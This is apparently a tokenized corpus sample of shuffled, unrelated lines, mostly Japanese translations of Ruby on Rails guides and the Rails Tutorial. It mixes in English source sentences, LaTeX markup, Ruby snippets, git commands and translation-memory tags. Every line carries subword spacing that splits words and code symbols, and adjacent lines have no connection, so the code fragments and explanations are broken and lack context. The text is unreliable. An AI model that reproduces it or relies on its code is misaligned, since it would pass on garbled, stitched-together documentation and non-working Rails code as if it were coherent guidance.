▁$ ▁git ▁format - patch ▁master ▁-- s td out ▁> ▁~/ my _ change s ▖ patch
▁# ▁=> ▁ { nil =>" ", ▁1 => "1" , ▁: x =>" A "}
▁リスト \ ref { code : sendgrid _ config } の メール 設定 には SendGrid アカウント の \ k ode { user \_ name } と \ k ode { password } 設定 を 記 入 する 行 もあります が 、 そこに は 記 入 せず 、 必ず 環境変数 「\ k ode { ENV }」 に設定する よう 十分 ご注意ください 。
▁### ▁ バリデーション 実行 時の 動作
▁concern ▁: image _ a tt a ch able ▁do
▁この節では 、 そのために 必要な ログアウト 機能 を追加する ことにします 。
▁* ▁`: as `
▁このメソッドは バリデーション を トリガ し 、 オブジェクト で エラーが発生し た場合 は true を 、 そう で なければ false を返します 。
▁has _ one ▁: account , ▁-> ▁ { ▁includes ▁: representative ▁ }
▁% w ( a ▁b ▁c ▁d )▖ to (2) ▁# ▁=> ▁% w ( a ▁b ▁c )
▁` remove ` メソッド を実行すると 、 すべての 該 当 パターン が 削除 されます 。
▁つまり 、 上のコード は 以下 と 等 価 です 。
▁ 色 も ちゃんと 表示 したい場合は \ ref { sec : minitest _ reporters } を ご 覧 ください 。
▁WARNING : ▁ アプリケーション の一部 、 特に ルーティング 周 り では 、` after _ initialize ` ブロック が呼び出され た時点で は 設定 が完了し ていない もの があります 。
▁NOTE : ▁CSS や JavaScript の 圧縮 を有効に する ` config ▖ assets ▖ compress ` 初期化 オプションは Rails ▁4 で 廃 止 されました 。
▁stylesheet _ link _ tag ▁: all , ▁cache : ▁true
▁たとえば 、` PhotosController ` クラスの アクション から 出力する のであれば 、` app / views / layouts / photos ▖ html ▖ erb ` または ` app / views / layouts / photos ▖ builder ` を探し ます 。
▁def ▁full _ message
▁` app / assets / stylesheets ` に置かれている スタイルシート アセット への URL を算出 します 。
▁ 読む に 値 する Rails 関連の 書 籍 や ドキュメント は 書 店 や Web で い く ら でも 見つけ られます ▟ 正 直 、 あまり の 多 さ に 閉 口 する ほど です 。
▁このコードは 一見 何 の 問題 も ない よう に見えます 。
▁person ▖ errors ▖ clear
▁#### # ▁ 攻 撃 の 難 読 化 と エ ン コーディング インジェクション
▁ このままでは 困 るので 、 ログイン している ことが は っ き り わかるように します ▟ そこで \ ref { sec : current _ user } では 、 セッション に含まれる ID を利用して 、 データベースから 現在のユーザー 名 を取り出し て 画面 で 表示する 予定です 。
▁\ ref { sec : login _ success } では 、 セッションを 操作 するために必要な コード をいくつか 追加 し 、 ユーザーログイン を完成させ る 予定です 。
▁ 本チュートリアル では 、 コマンドライン ▁( ターミナル ) ▁ の コマンド 例 が 多 用 されています 。
▁ スコープ を設定する ことで 、 関連 オブジェクト や モデル への メソッド呼び出し として 参 照 される 、 よく 使用される クエリ を指定することができます 。
▁ パスワード 確 認 の 強 制 は コントローラの 階層 でも 行う ことができます が 、 モデル の中で Active ▁Record を使用して 制限 を与える のが 慣習 になっています 。
▁$ ▁bin / rails ▁generate ▁job ▁ guest s _ cleanup ▁-- queue ▁ ur g ent
▁Home ページ ▁(\ href { http ://0▖0▖0▖0:3000/ }{/ }) ▁ に マイクロポストの 投 稿 フォーム を追加する
▁( 最初に テスト を作成して から に してください ▟)
▁* ▁` config ▖ action _ dispatch ▖ encrypted _ cookie _ s alt ` は 、 暗号化 済み cookie 用の s alt 値 を設定します 。
▁render ▁: edit
▁# ▁ 指定された 日付 を デフォルト値 に 持つ セレクト ボックス を生成する
▁ 本書 では なるべく 問題が生じ にくい ような 手順を 記載 しました が 、 すべて をカバー する ことはできません ▟ 問題が生じ たら ネ ッ ト を検索する のが 早 道 です 。
▁It ▁failed ▖
▁図 \ ref { fig : login _ mockup } と 図 \ ref { fig : signup _ mockup } を 比較してみると 、 ログインフォーム と ユーザー登録フォーム に はほとんど 違い がない ことがわかります ▟ 違い は 、 4 つ あった フィールド が ▁[ E mail ] ▁ と ▁[ Password ] ▁ の 2 つ に 減 っている こと だけです 。
▁x ▁ += ▁1
▁@ order ▁= ▁@ customer ▖ orders ▖ build ( order _ date : ▁Time ▖ now ,
▁issue レポート が自動的に 修正 担 当 者 を見つけ てくれる ことも ありません し 、 他の 開発者 が 自分の 作業を 差 し 置 いて まで 修正 してくれる ことも ありません 。
▁* ▁` control s : ▁true ` は 、 ブラウザ が提供する ビデオ 制御 機能 を使用 できるようにします 。
▁ 以後 本ガイド では これらの 方法 をすべて 紹介します ( 訳 注 : ▁本ガイドでは render を 一般的な 意味 では 「 出力 」 、 具体的な 動作 を指す 場合は 「 レンダリング 」 と 訳 しています ) 。
▁リスト \ ref { code : generating _ pages } や リスト \ ref { code : generate _ users _ controller } で アクション 名 を使用して 生成 した 例 と 比 較 してみてください 。
▁このオプション を指定すると 、 属性の値 が ` blank ?` に 該当する 場合に バリデーション が パス します ▟ ` blank ?` に 該当する 値 には ` nil ` と 空 文字 も含まれます 。
▁self を省略した 結果を リスト \ ref { code : settings _ link _ test } に示します 。
▁created _ at : ▁"2013-03-11 ▁00:57:46" , ▁updated _ at : ▁"2013-03-11 ▁00:57:46" >
▁end
▁この 「 forgot ▁password 」 リンクをクリックすると フォーム が表示され 、 そこに メールアドレスを 入力 して メールを送信 すると 、 その メール に パスワード 再設定 用の リンク が 記載 されています ▁( 図 \ ref { fig : forgot _ password _ form _ mockup }) 。
▁### ▁` overlap s ?
▁### ▁` to _ formatted _ s `
▁最後に 、` create ` や ` new ` に ブロック が渡され ると 、 新しい オブジェクトは 初期化 のために ブロック に渡され ます 。
▁{0} 第 {1} 1 {/1} 章 {/0} や {2} 第 {1} 2 {/1} 章 {/2} , ▁I ▁suggest ▁following ▁the ▁“ hello , ▁world ! ”
▁ここまで 実装 を 進 め てきた ので 、 あ と ほんの 数 行 を追加して セキュア パスワード の実装 を 完了 し 、 テストスイート を 緑色 ▁( 成功 ) ▁ に しましょう 。
▁#### ▁` to ( position ) `
▁c attr _ accessor ▁: surname , ▁instance _ accessor : ▁false
▁ 将来 変更 の 可能性 が 少し でも ある コード ▁( HTML 構造 の 細 部 など ) ▁ があれば 必ず テストを書く 。
▁else
▁( クラウド IDE の場合は < 自分の システム > に U b un t u と 指定します ) 。
▁ 検索 キー
▁ 日付 ・ 時刻 用の select タグ の セット を返します ▟ タグ は 年 ・ 月 ・ 日 ・ 時 ・ 分 用に それぞれ あり 、 日付 ・ 時刻 に関する 特定の 属性 にアクセス して 日時 が 選択 済み になります 。
▁false ▖ duplicable ?
▁ コード 自体 は以下のようになります 。
▁ 特に 0 および 0 ▖ 0 は ** 空白 ではありません ** のでご注意ください 。
▁\ emph { Ruby ▁on ▁Rails チュートリアル } の 第 2 版 と 本書 のバージョン と の違い を 、 この後 の リスト に示します
▁次に 、` Blorgh :: Article ` モデルに も ` author _ name ` フィールド を 実際の ` User ` オブジェクト に変換 し 、` User ` オブジェクトを 記事 の ` author ` と 関連付け て から 記事 を保存する コード が必要です 。
▁* ▁Action ▁Pack 内の ミドルウェアスタック について
▁* ▁Rails の ビルトイン ヘルパー の 活用 方法
▁=> ▁Sun , ▁1 3 ▁Mar ▁2011 ▁0 3 : 38 : 55 ▁UTC ▁+00:00
▁ このテストは 作成 可能です が 、 著者 の 経験 上 、 cookies の値 を直接 調 べ る 方法は Rails の実装 に 左 右 され やすい 傾 向 があり 、 次の バージョンの Rails では また 変わる かもしれません 。
▁本章では 、 一番 重要な ステップ である ユーザー用の \ emph { データモデル } の作成 と 、 データを 保存 する手段 の 確 保 について 学 んで い きます 。
▁本ガイドでは 、 Rails ▁API ドキュメント 作成 の ガイドライン について解説します ( 訳 注 : ▁API ドキュメント が 英語 で 書かれ ること を 前提と します ▟ また 、 サンプル の コメント は 基本的に 英語 のまま に しています ) 。
▁ただし 、 この ` blorgh ` エンジン は ローカル P C で 開発 中 で gem リポジトリ には 存在しない ので 、` Gemfile ` で エンジン gem へのパス を `: path ` オプションで 指定 する必要があります 。
▁それでは 、 この ルーティング ファイルを 変更 してみましょう ▟ サーバー の ルート URL にアクセス したら 、 デフォルトの ページ の代わりに ユーザー 一覧 を表示する ようにします ▟ つまり 、「 / 」( スラッシュ ) ▁ にアクセス したら / users を開く ようにします 。
▁# ▁Blorgh / app / models / article ▖ rb
▁図 \ ref { fig : mvc _ detailed } で 行われている 手順 の概要 を以下に示します 。
▁╼╼\ end { enumerate }╼╼ ▁% ▁subsection ▁micropost _ validations ▁( end )╼╼ ▁\ subsection { User / Micropost の関連付け } ▁% ▁( fold )╼ ▁\ label { sec : user _ micropost _ associations }╼╼
▁\ k ode { relationships } テーブル を作成する ために 、 いつものように データベースの マイグレーション を行います 。
▁ データモデル の 変更 が必要 に なったら その 都 度 マイグレーション を行う のが Rails 流 です 。
▁* ▁` create _ association !(
▁if ▁@ user ▁&& ▁@ user ▖ guest ?
▁今度は テストスイート が {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁もし 莫 大 な 数 の レコード に対して このような コードを ま とも に 実行する と 、 コレクション 全体 の サイズ が メモリ 容 量 を 上 回 っ てしまう ことでしょう 。
▁上の コマンドで は 、 データベースから users テーブル を削除する ために \ k ode { drop \_ table } コマンドを 内部で 呼び出し ています 。
▁この リモート は upstream 以外の 名前 にも 設定 できます ▟ ` upstream ` という 名前 に したくない場合 は 、 以下の 手順 に従って 名前 を 変更します 。
▁この データモデル の 模 式 図 に すると 、 図 \ ref { fig : user _ has _ many _ following } のようになります 。
▁このコードは \ k ode { db : populate } タスク を定義します ▟ この タスク は 、 それら しい 名前とメールアドレス を持つ 99 のユーザー を作成し 、 従来 のユーザー と 置き換え ます 。
▁ デプロイ が 無 事 に 終 わ ると 、 本番環境で サンプルアプリケーション が 動いている はずです ▁( 図 \ ref { fig : layout _ production }) 。
▁\ k ode { touch } コマンドは 本 来 ファイル や ディレクトリ の タイムスタンプ だけ を更新する ための コマンド なのです が 、 ファイルが 存在しない 場合には 空 ファイル を作成する という 一種の 副 作 用 があります
▁このメソッドは 、 指定された テキスト に 基 いた リンク を作成し 、 ジ ャ ン プ 先 を表示します ▟ ここでは 各 記事 へのパス を指定します 。
▁今度は 、 タイトル のテスト が パス する ように し 、 それ と 同時に Web ページを 正しく 表示 させるため の HTML をすべて 追加 しましょう 。
▁sample ▁application ▖
▁ 特に 、` qualified _ constant _ defined ?` メソッドは 2 つ目の 引数として 、 述 語 を 先 祖 に 向 って 遡 って 探 す かどうか という フラグ を オプションで 指定 できます 。
▁これにより 、 必要に応じて 後 から アセットパイプライン を追加する こともできます 。
▁CSS マニフェスト における ` require _ tree ` ディレクティブ の動作 は JavaScript の場合と同様 に 現在の ディレクトリ にある すべての スタイルシート を require します 。
▁ 説明 用の ユーザー モデル を作成し たので 、 続いて ` app / controllers / users _ controller ▖ rb ` を 編集 し 、 新規ユーザー の 保存 成功 直後 に ` User Mailer ` の ` User Mailer ▖ welcome _ email ` を使用して そのユーザー に メール が 送信される ようにしましょう 。
▁` app / assets / stylesheets / blorgh / style ▖ css ` という アセット を例にとって 説明します ▟ この アセットを アプリケーション に含め る には 、` stylesheet _ link _ tag ` を使用して アセット が あ た か も エンジン 内部 にある か のように 参 照 します 。
▁ 関連する 以下の テストが 失敗する ことを確認する ことで 、 この ことを ダブルチェック できます 。
▁2 番目の \ k ode { link \_ to } では 、 引数として 画像ファイル の パス と 任意の オプション ハッシュ を と る \ k ode { image \_ tag } ヘルパー の 能 力 が示されています ▟ シンボル を使用して 、 この場合は \ k ode { alt } 属性を 設定 しています 。
▁また 、 他の フレームワーク で 成功 を 収 め た 新しい 技術 があれば 、 Rails の 創 始 者 である \ href { http :// lo u d th in k ing ▖ com /}{ David ▁H einemeier ▁Hansson } ▁( D H H ) ▁ や \ href { http :// rubyonrails ▖ org / core } { Rails の コア チーム } は 、 そう した ア イ デ ア を 常に 積 極 的に 取り 入 れ ています 。
▁### ▁` re order `
▁ メッセージ を ▁\ href { http :// l m gt fy ▖ com /}{ グ ー グ ル してみ たり } 、 または 、 諦 めて 再起動 してみ たり 、 っ と 色 々 あり あ ます ▟ ╼╼ ウェブ アプリ には 様々な 動的 機能 があります 、 それら は 、 高 度 技術 力 を 成 長 させるため の き か い に つながり ます ▟ Rails の ウェブ 開発 では 、 ╼ ▁In ▁the ▁context ▁of ▁Rails ▁web ▁development , ▁some ▁specific ▁examples ▁of ▁technical ▁ sophistication ▁include ▁making ▁sure ▁you ' re ▁using ▁the ▁right ▁Ruby ▁gem ▁versions , ▁running ▁\ text tt { bundle ▁install } ▁or ▁\ text tt { bundle ▁update }, ▁and ▁restart ing ▁the ▁local ▁ webserver ▁if ▁something ▁doesn ' t ▁work ▖ ▁( Don ' t ▁worry ▁if ▁all ▁this ▁ s ound s ▁like ▁g i b be ri sh ; ▁we ' ll ▁cover ▁everything ▁mentioned ▁here ▁in ▁the ▁course ▁of ▁complet ing ▁this ▁tutorial ▖ )╼╼ As ▁you ▁proceed ▁through ▁this ▁tutorial , ▁in ▁all ▁like li h ood ▁you ▁will ▁ o cc as ion ally ▁be ▁tri p ped ▁up ▁by ▁things ▁not ▁immediately ▁working ▁as ▁expected ▖ ▁A lthough ▁some ▁particular ly ▁trick y ▁steps ▁are ▁explicitly ▁highlight ed ▁in ▁the ▁text , ▁it ▁is ▁ im possibl e ▁to ▁an tic ip ate ▁all ▁the ▁things ▁that ▁can ▁go ▁wrong ▖ ▁I ▁recommend ▁you ▁e mb ra ce ▁these ▁in evi table ▁ st um b l ing ▁blocks ▁as ▁opportunit ies ▁to ▁work ▁on ▁i mprov ing ▁your ▁technical ▁ sophistication ▖ ▁Or , ▁as ▁we ▁say ▁in ▁\ href { https :// www ▖ learn en ough ▖ com / command - line - tutorial # aside - speak _ ge e k } { ge e k ▁ speak } : ▁\ emph { It ' s ▁not ▁a ▁bug , ▁it ' s ▁a ▁feature ! }╼╼\ end { aside }╼╼\ begin { figure }╼\ begin { center }╼\ image { images / figures / tech _ support _ cheat _ sheet ▖ png }╼\ end { center }╼\ caption { ` ` \ href { https :// m ▖ xkcd ▖ com / 6 27 /}{ T e ch ▁Support ▁C h e at ▁Sheet } '' ▁( via ▁\ href { http :// xkcd ▖ com /}{ xkcd }) ▖ ▁\ label { fig : tech _ support _ cheat _ sheet } }╼\ end { figure }╼╼ ╼ The ▁\ emph {
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / with _ options ▖ rb ` です 。
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁removed _ at ▁ IS ▁NULL
▁< script ▁src ="/ javascripts / all ▖ js "></ script >
▁`: on ` オプションは `: create ` または `: update ` のいずれか の 値を 取り ます 。
▁\ k ode { - r f } フラグ は 、「 recursive 」( サブディレクトリ や その 中の ファイル も すべて 削除 する ) ▁ と 「 force 」( 削除 して 良い かどうかを ユーザーに 確認し ない ) ▁ を指定する オプション です 。
▁ただし 、 ユーザー用の fixture ファイル ▁( リスト \ ref { code : default _ fixtures }) ▁ と同じように 、 生成された リレーションシップ 用の fixture では 、 マイグレーション ▁( リスト \ ref { code : relationships _ migration }) ▁ で 制 約 させた 一意性 を 満 た す ことができ ません 。
▁b section ▁image _ upload _ in _ production ▁( end )╼╼ ▁% ▁section ▁micropost _ images ▁( end )╼╼ ▁\ section { 最後に } ▁% ▁( fold )╼ ▁\ label { sec : user _ microposts _ co nclusion }╼╼ With ▁the ▁addition ▁of ▁the ▁Microposts ▁resource , ▁we ▁are ▁ nearly ▁ finished ▁with ▁our ▁sample ▁application ▖
▁ ユーザーを 希 望 の ページに 転 送 するには 、 リクエスト 時点 の ページを どこか に保存 しておき 、 その 場所に リダイレクト させる 必要があります 。
▁ユーザー登録 失敗 時の エラーメッセージ
▁ セキュア に ハッシュ化 した パスワードを 、 データベース 内の \ k ode { password _ digest } という 属性 に保存 できるように なる 。
▁ 具体的な テスト 方法 について ですが 、 まず \ emph { 有効な } モデルの オブジェクト を作成し 、 その 属性 のうち の 1 つ を 有効 でない 属性 に 意図 的に 変更します ▟ そして 、 バリデーション で 失敗する かどうか をテストする 、 といった 方 針 で 進 め ていきます 。
▁def ▁validate
▁(\ ref { sec : con ve n tion s } でも 説明したとおり 、 途中 の ドット だけ の 行 は 省略 を 意味 している ので 、 その 部分 は そのまま コピー しないでください ) 。
▁ ちなみに 、 ここに flash のテスト も 追加 して おくとよいでしょう ▟ これは 演習 として 残しておきます ▁(\ ref { sec : exercises _ a _ test _ for _ valid _ submission }) 。
▁{0} 図 11 ▖ 10 {/0} ▁{1} マイクロポスト作成フォーム のある ホ ーム 画面 のモックアップ {/1}
▁| app / | ここに は アプリケーションの コントローラ 、 モデル 、 ビュー 、 ヘルパー 、 メイラー 、 そして アセット が置かれます 。
▁この 課題 は 大 して 難 しく ないので 、\ ref { sec : exercises _ testing _ the _ remember _ me _ box } の演習 に 回 す ことにします ▟ さ し あ た って 、 今は 関連する cookies が \ k ode { nil } である かどうか だけ を チェック すれば よい ことにします 。
▁リスト \ ref { code : user _ profile _ test } では マイクロポストの 投 稿 数 をチェックする ために 、\ k ode { {1} 第 10 章 {/1} } の演習 ( \ ref { cha : password _ reset }) で紹介した { 4 } response ▖ body {/4} を使っています 。
▁ アプリケーションの 機能 向上 に応じて 独自の ヘルパー を追加する ことも 簡単に できます 。
▁ 使用する すべての キー と 値を 列 挙 する 理由は 、 他の フラッシュメッセージ も 使えるように する ためです 。
▁<%= ▁asset _ path ▁' image ▖ png ', ▁host : ▁' my cdn subdomain ▖ fi ctional - cdn ▖ com ' ▁%>
▁ これはリスト \ ref { code : remember _ me _ ternary } で使用されていました 。
▁<% # ▁ 間 違い ▁%>
▁まずは 後 者 から 見 てみましょう 。
▁ 数値 は さまざまな 方法で フォーマット できます 。
▁このコードは Rails と Ruby と SQL が 複 雑 に 絡 み 合 って いて 厄 介 ですが 、 ちゃんと 動作します 。
▁これらの ファイル や 、 その 他 重要な 情報 を含む 可能性のある ファイルを 、 環境 に合わせて 複数の バージョン を使い 分ける ことで さ ら なる アクセス 制限 を 行なうことができます 。
▁# ▁calling ▁+ to _ s + ▁on ▁all ▁elements ▁and ▁join ing ▁them ▖
▁ 最大 の違い は 、 ユーザー登録 は 誰 でも 実行 できます が 、 ユーザー情報 を 更新 できる のは そのユーザー 自身 に限ら れる ということです 。
▁ foo => ▁nil
▁* ▁`: password ` ▁- ▁ メール サーバー で 認 証 が 要求 される 場合は 、 ここで パスワード を設定します 。
▁-> ▁ { ▁where ▁" factory ▁= ▁' S eattle ' " ▁ }
▁このオプション は 、 デフォルトでは ` ActiveSupport :: Logger :: Simple Form at ter ` のインスタンス を使用します ▟ ただし production モード の場合 のみ ` Logger :: Form at ter ` が デフォルト になります 。
▁With ▁the ▁\ k ode {@ user } ▁instance ▁variable ▁from ▁Listing ~\ ref { code : initial _ edit _ action }, ▁the ▁edit ▁page ▁should ▁render ▁properly , ▁as ▁show n ▁in ▁Figure ~\ ref { fig : edit _ page } ▖ ╼╼ リスト \ ref { code : initial _ edit _ action } の \ k ode {@ user } インスタンス変数 使う と 、 編集 ページ が うまく 描画 される ようになります ▁( 図 \ ref { fig : edit _ page }) 。
▁ qualified _ name ▁= ▁ qualified _ name _ for ▁from _ mod , ▁ const _ name
▁\ k ode { add _ password _ digest _ to _ users } という マイグレーション ファイル を生成する ためには 、 以下のコマンドを実行し ます 。
▁ このような 危 険 がある から こ そ 、 編集 しても よい 安全 な 属性 だけ を更新する ことが 重要 になります 。
▁詳細については 本ガイド の [ ルーティング ](# ルーティング ) セクション で 解説します 。
▁ ユーザー名 と メールアドレス に対応する \ emph { ア ト リ ビュー ト ア ク セ サ } をそれぞれ 作成します 。
▁ ユーザープロファイルページ の 最終的な 目標は 、 図 \ ref { fig : profile _ mockup } のように ユーザーの プロファイル 写 真 と 基本 ユーザー データ 、 そして マイクロポスト の一覧を表示 することです 。
▁ いよいよ 、 最初の サインイン 要素 である \ k ode { sign _ in } 関数 自身 の実装 に取りかかりま しょう 。
▁=> ▁" mhartl @ example ▖ com "
▁# ▁ アセット URL の ダイジェスト を生成する
▁* ▁ アプリケーションが 返 して く る 例外 を 捕 え 、 例外 処理 用の アプリケーションを 起動 します ▟ 例外 処理 用の アプリケーションは 、 エ ンド ユーザー 向 け に 例外 を 整 形 します 。
▁" digest ":" 1 c 57 5278 9 5 88 ac 18 d 7 e 1 a 50 b 1 f 0 fd 4 c 2 " }, " favicon - a 9 c 64 1 b f 2 b 8 1 f 04 76 e 87 6 f 7 c 5 e 37 59 6 9 ▖ ic o ":{" logical _ path ":" favicon ▖ ic o "," m time " : "2013-0 7-2 6 T 23 :00 : 10 - 07 :00 "," size " : 140 6 ,
▁この テストが 暗 に 示 している ように 、 実は この アプリケーションコード が Ajax リクエスト への 応答 に使用する \ k ode { create } アクションと \ k ode { destroy } アクションは 、 通常の HTTP ▁\ text tt { POST } リクエスト と \ text tt { DELETE } リクエスト に応答する の に 使用される の と同じ ものです 。
▁ パス する は ず のテスト が 失敗した場合 は 、\ text tt { Ctrl - C } で Spork サーバー を 停 止 して 再起動 してください 。
▁options
▁ テストにパス した としても 、 コード の中に ある 以下の コメント に 気付いた方もいると思います 。
▁``` coffee script
▁4 番目の ログイン 中の コンピュータ への 物 理 アクセス による 攻 撃 については 、 さ す が に システム 側 での 根 本 的な 防 衛 手 段 を 講 じ ること は 不 可能な のですが 、 ユーザーが ログアウト したときに トークン を 必ず 変更 し 、 機 密 上 重要 になる 可能性のある 情報を ブラウザに 表示する ときには \ emph { 暗 号 による 署 名 } を行う ように することで 、 物 理 アクセス による 攻 撃 を 最小限 に 留 め る ようにします 。
▁#### # ▁` prev _ month `、` next _ month `
▁以下の よう になるはずです 。
▁第 3 章 以降 では 、 いよいよ 本格的な 大 規 模 \ emph { サンプルアプリケーション } ▁(\ k ode { sample \_ app } ▁ ) を 開発 します ▟ 自動生成 コードは 使 わ ずに 、 ゼロ から コードを 書き 進 め ます 。
▁この 項 では 、 ユーザーの プロフィール画面 ▁(\ k ode { show ▖ html ▖ erb }) ▁ で その ユーザーのマイクロポスト を 表示 させ 、 また 、 これまで に 投 稿 した 総 数 も 表示する ように していきます 。
▁ ファイル名 に ダイジェスト が含まれ ない と 、 遠 い 将来 に ヘッダ が設定され たときに ▁( ブラウザ などの ) ▁ リモート クライアント が ファイル の内容 変更を 検出 して 再度 取得 する ことができ なくなってしまいます 。
▁* ▁development 環境で コードの 再 読み込み を行う ために 、 prepare コールバック と cleanup コールバック を提供します 。
▁table _ name ▖ pluralize ▁: ▁table _ name
▁` find _ by !` メソッド の動作 は 、 マッチする レコードが 見つからない 場合に ` ActiveRecord :: RecordNotFound ` 例外 が発生する 点 を除いて 、` find _ by ` メソッドと まったく 同じです 。
▁ これはリスト \ ref { code : generate _ users _ controller } で使用されていました 。
▁* ▁` set _ autoload _ paths `: ▁この イニシャライザ は ` bootstrap _ hook ` より 前に 実行されます 。
▁#### ▁ 一般的な エンジンの 設定
▁d ▁= ▁Date ▖ new (201 0, ▁5 , ▁ 9 ) ▁# ▁=> ▁Sun , ▁09 ▁May ▁2010
▁ 開発 中に \ href { http :// en ▖ w ikipedia ▖ org / wiki / M i li t ary _ s lang # S N A F U } { 袋 小 路 } に 迷 い 込 んで しま った 場合 でも 、 これらの 機能 を使えば 元の 状態 を 復 元 できます 。
▁╼╼ ▁\ subsection { Git のメリット } ╼ ▁\ label { sec : what _ g ood _ does _ git _ do _ you }╼╼ If ▁you ' ve ▁ never ▁used ▁version ▁control ▁before , ▁it ▁may ▁not ▁be ▁entire ly ▁clear ▁at ▁this ▁point ▁what ▁good ▁it ▁does ▁you , ▁so ▁let ▁me ▁give ▁just ▁one ▁example ▖
▁ そのために は 、 Rails の \ emph { ルーター ▁( route r )} ▁ を 編集 します ▟ ルーター は コントローラと ブラウザの 間 に 配置 され ▁( 図 \ ref { fig : MVC }) 、 ブラウザから の リクエストを コントローラに 振 り 分ける ▁( = ルーティング ) ▁ 役 割 を 果 た します
▁#### # ▁` beginning _ of _ day `、` end _ of _ day `
▁上の 場合には 、` Customer ` モデルの 方 に ` orders _ count ` カラム を追加する 必要があります 。
▁ここまで 作業 を進める と 、\ href { https :// github ▖ com / railstutorial / sample _ app _ rails _ 4 } { 著者 が GitHub に アップロード した Rails チュートリアル の サンプルアプリケーション } のようになります ▁( ユーザー名 は \ text tt { railstutorial } で 、 アプリケーション 名 は \ text tt { sample _ app _ rails _ 4 } と 若 干 異なります )
▁person ▖ errors ▖ messages
▁# ▁ SELECT ▁id ▁FROM ▁people
▁1 つの 行 が 長 く なり すぎる 場合は コメント を 次の 行 に置い ても よい
▁ コントローラ 側 から 見 ると 、 HTTP レスポンス の作成 方法は 以下の 3 とおり あります 。
▁ ほとんどの場合 、 ダブルクォート と シングルクォート のどちら を使用して も 実 質 的に 同じです 。
▁` monday ` メソッドと ` sunday ` メソッドは 、 それぞれ 前の 月 曜 、 次の 日 曜 をそれぞれ 返します 。
▁\ ref { sec : adding _ to _ the _ layout } では 、 多くの HTML 要素 に CSS クラスを 関連付け ました ▟ こう しておくこと で 、 CSS ベース で レイアウト を構成する 際に 高い 柔 軟 性 を与え て く れ ます 。
▁page ▖ email s ▖ create (
▁その 場合 、 以下の 方法で 設定 できます 。
▁<%= = ▁@ cm s ▖ current _ template ▁%> ▁<% # ▁@ cm s ▖ current _ template をそのまま 挿 入 ▁%>
▁=> ▁" $ 2 a $ 10 $ k n 4 c Q D J T z V 76 Z g D x O W k 6 J e 9 A 0 T t n 5 s K N a G TE m T 0 j U 7 ▖ n ▖▖▖"
▁#### # ▁` collection ▖ build ( attributes ▁= ▁{}) `
▁map ▁ { ▁| attribute , ▁message | ▁full _ message ( attribute , ▁message ) ▁ }
▁{0} 図 9 ▖8{/0}{1} ユーザーインデックスページ \ href { http :// localhost :3000/ users }{/ users } に ユーザーが 1 人 しか 表示 されていない ▟\ href { http :// railstutorial ▖ org / images / figures / user _ index _ only _ one _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁次に 必要な メソッドは \ k ode { html } です ▟ これは 、 引数 の中で 指定された 要素 の内側に ある HTML を更新し ます 。
▁ ある ユーザーが 、 別の ユーザーを フォローしている ところ を 考えてみましょう ▟ 具 体 例を 挙 げ ると 、 Calvin は Hobbes を フォロー しています ▟ これを 逆 から 見 れば 、 Hobbes は Calvin から フォロー されています ▟ Calvin は Hobbes から 見 れば \ emph { フォロワー ▁( follower )} であり 、 Hobbes は Calvin によって \ emph { フォロー されている ▁( followed ) ▁ } ことになります 。
▁ ブロック を与える 場合にも 、 レシーバ が 空の ときの デフォルト値 を カスタマイズ できます 。
▁続いて 、 新しい 記事 を 1 つ 作成 してみる ことにしましょう 。
▁ Transfer - Encoding : ▁ ch un k ed
▁\ k ode { : data - turbolinks - track } という シンボル を作成し よう とします が 、 シンボル では ハイフン を使用 できない ため 、 この 記 法 は 無効 です 。
▁ 追 記 : ▁\ text tt {@ foo ▁|| ▁@ foo ▁= ▁" bar "} と 書いた 場合 ▁( | | が 左 辺 にある 点に注意 ) 、 Ruby の 内部で は 実際に すべての 項 が 評価 されます ▟ これは 、\ text tt {@ foo } が \ text tt { nil } や \ text tt { false } の 場合に 無駄な 代入 を 避ける 必要がある ためです 。
▁$ ▁git ▁push ▁ origin ▁branch _ name
▁Sessions コントローラの \ k ode { create } に 上の 行 を追加した 結果を リスト \ ref { code : remember _ me _ ternary } に示します ▟ 驚 く ほど コンパクト な コード になりました 。
▁これは 、2 つの 文字列 の長さ が 異 なり 、 短い 方が 長い 方 の 途中 まで 完全に 一致し ている ような 場合 、 長い 方 の 文字列 は 短い 方 よりも 辞書 上の 並び順 が 前 として 扱 わ れる ということです 。
▁* ▁X - Sendfile ▁header を設定します 。
▁ _ ' no sniff ' ▁ は Rails では デフォルト です ▟ _ ▁- ▁ ファイルの MIME タイプ を ブラウザ が 推 測 しない ようにします 。
▁以上で Ruby の 文字列 に関する 説明 は 終わり です ▟ あ 、 言い 忘れ ていた こと があり ました ね ▟ 「 Ruby の 世界 へ よう こ そ !」
▁issue の レポート に 続 く 貢献 方法 として 、 コア チーム が 既存の issue を解決する の を 手 伝 う こともできます 。
▁この フラグ は development モード と test モードでは true 、 production モードでは false に設定されます 。
▁` instance _ variable _ name s ` メソッドは 配列 を返します 。
▁* ▁`: o d d ` ▁- ▁true に設定され ている 場合は 、 奇 数 で なければなりません 。
▁tags ▁= ▁% w ( a ▁ acronym ▁b ▁ strong ▁i ▁ em ▁ li ▁ ul ▁ ol ▁h 1 ▁h 2 ▁h 3 ▁h 4 ▁h 5 ▁h 6 ▁block quot e ▁br ▁c ite ▁sub ▁ s up ▁in s ▁p )
▁ 今後 は 常に 文字列を キー に するようにしてください 。
▁Rails だけ は インストール されていません が 、 これは もちろん チュートリアル のために 意図 的に そう して あります ▁(\ ref { sec : installing _ rails }) 。
▁# ▁ SELECT ▁" articles "▖
▁ ある ミドルウェア の 後に 別の ミドルウェア を追加 したい場合は ` insert _ after ` を使用します 。
▁#### # ▁ コントローラ 用の レイアウト を指定する
▁Author : ▁ Michael ▁Hartl ▁< michael @ michael hartl ▖ com >
▁Active ▁Record モデルの 力 によって 、 マイクロポスト も ▁( ユーザー と同じ で ) ▁ リソース として 扱 え る
▁ これはリスト \ ref { code : password _ reset _ expire _ test } で使用されていました 。
▁### ▁ ス ラ イ ス
▁Rails が デフォルトで 作成する ファイル については {0}{1} 表 1 ▖ 2 {/1}{/0} を参照してください ▟ これらの ファイル や ディレクトリ の 目的 については 本チュートリアル 全体 に 渡 って 説明 いた します 。
▁また 、 フォローしているユーザー と 、 フォロワー に それぞれ 表示 用の ページ を作成します 。
▁- h ▁This ▁message
▁( 3 つ目の 重要な 機能 である \ emph { ミックスイン } については 、\ ref { sec : rails _ environments } で 紹介します ) 。
